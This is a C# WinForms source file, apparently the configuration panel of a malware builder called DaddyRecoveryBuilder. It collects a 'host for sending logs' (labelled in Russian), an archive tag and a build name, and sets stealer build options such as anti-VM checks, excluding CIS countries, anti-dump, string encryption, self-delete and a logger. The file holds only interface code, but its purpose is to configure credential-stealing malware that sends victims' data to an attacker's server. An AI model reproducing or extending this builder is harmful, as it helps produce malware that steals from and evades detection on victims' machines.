namespace DaddyRecoveryBuilder.ExForms
{
    using System;
    using System.Drawing;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using Helpers;
    using Properties;

    public partial class FuncFrm : UserControl
    {
        public FuncFrm()
        {
            InitializeComponent();
        }

        private void ToDicData_Click(object sender, EventArgs e)
        {
            ActiveControl = null;

            //if (!string.IsNullOrEmpty(HostBox.Text) || !HostBox.Text.StartsWith("http://") || !HostBox.Text.StartsWith("https://"))
            //{
            //    MessageData.Location = new Point(363, 282);
            //    ControlActive.ShowTextAsync(MessageData, "Incorrect link", Color.FromKnownColor(KnownColor.Firebrick), 2000);
            //    return;
            //}

            //if (string.IsNullOrWhiteSpace(HostBox.Text))
            //{
            //    MessageData.Location = new Point(364, 282);
            //    ControlActive.ShowTextAsync(MessageData, "Empty Host", Color.FromKnownColor(KnownColor.Firebrick), 2000);
            //    return;
            //}

            if (string.IsNullOrWhiteSpace(ArchiveTagBox.Text))
            {
                MessageData.Location = new Point(340, 282);
                ControlActive.ShowTextAsync(MessageData, "Empty ArchiveTagBox", Color.FromKnownColor(KnownColor.Firebrick), 2000);
                return;
            }
            if (string.IsNullOrWhiteSpace(OutBuildBox.Text))
            {
                MessageData.Location = new Point(345, 282);
                ControlActive.ShowTextAsync(MessageData, "Empty OutBuildBox", Color.FromKnownColor(KnownColor.Firebrick), 2000);
                return;
            }

            Collector.AddToDic("Host", HostBox.Text);
            Collector.AddToDic("Tag", ArchiveTagBox.Text);
            Collector.AddToDic("OutBuild", OutBuildBox.Text);

            BuildSettings.Virtual_Machine = VirtualBox.Checked;
            BuildSettings.CIS_Country = CountryCISBox.Checked;
            BuildSettings.Anti_Dump = AntiDumpBox.Checked;
            BuildSettings.String_Encrypt = StringEncBox.Checked;
            BuildSettings.Output_Console = OutConsoleBox.Checked;
            BuildSettings.Output_WinForm = OutFormsBox.Checked;
            BuildSettings.Self_Delete = DeactiveBox.Checked;
            BuildSettings.Active_Logger = LoggerBox.Checked;

            MessageData.Location = new Point(343, 282);
            MusicPlay.Inizialize(Resources.Click);
            ControlActive.ShowTextAsync(MessageData, "Data added success", Color.FromKnownColor(KnownColor.DarkOrchid), 5000);
        }

        private void FuncFrm_Load(object sender, EventArgs e)
        {
            NativeMethods.SendMessage(HostBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Ваш хост для отправки логов");
            NativeMethods.SendMessage(ArchiveTagBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Tag для архива");
            NativeMethods.SendMessage(OutBuildBox.Handle, NativeMethods.EM_SETCUEBANNER, 0, "Имя билд файла например Build");
        }

        private void ConnectHost_Click(object sender, EventArgs e)
        {
            ActiveControl = null;
            Task.Run(() =>
            {
                if (NetControl.CheckURLOnlineOrNot(HostBox.Text))
                {
                    MessageData.Location = new Point(605, 189);
                    ControlActive.ShowTextAsync(MessageConnect, "Connection successfully", Color.FromKnownColor(KnownColor.ForestGreen), 2000);
                }
                else
                {
                    MessageData.Location = new Point(628, 189);
                    ControlActive.ShowTextAsync(MessageConnect, "Failed to connect", Color.FromKnownColor(KnownColor.Firebrick), 2000);
                }
            });
        }

        private void HostBox_TextChanged(object sender, EventArgs e)
        {
            ConnectHost.Visible = NetControl.IsValidURL(HostBox.Text);
        }

        private void OutConsoleBox_CheckedChanged(object sender, EventArgs e)
        {
            if (OutConsoleBox.Checked)
            {
                OutConsoleBox.Checked = true;
                OutFormsBox.Checked = false;
            }
        }

        private void OutFormsBox_CheckedChanged(object sender, EventArgs e)
        {
            if (OutFormsBox.Checked)
            {
                OutFormsBox.Checked = true;
                OutConsoleBox.Checked = false;
            }
        }

        private void OutBuildBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsDigit(e.KeyChar) && (e.KeyChar == '.' || e.KeyChar == ',' || e.KeyChar == '/') && OutBuildBox.Text.IndexOf('.') == -1 && OutBuildBox.Text.IndexOf(',') == -1)
            {
                e.Handled = true;
            }
        }
    }
}